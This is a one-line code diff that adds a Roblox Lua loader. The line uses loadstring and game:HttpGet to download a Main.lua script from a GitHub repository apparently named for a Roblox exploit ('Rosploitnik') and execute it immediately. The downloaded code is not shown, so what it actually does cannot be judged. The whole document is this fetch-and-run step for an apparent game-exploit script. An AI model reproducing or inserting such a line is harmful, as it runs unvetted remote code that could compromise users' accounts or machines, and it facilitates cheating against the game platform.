@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/desognedbyjonturtletaub/Dr.-Rosploitnik/v0.0.9/Main.lua", true))()
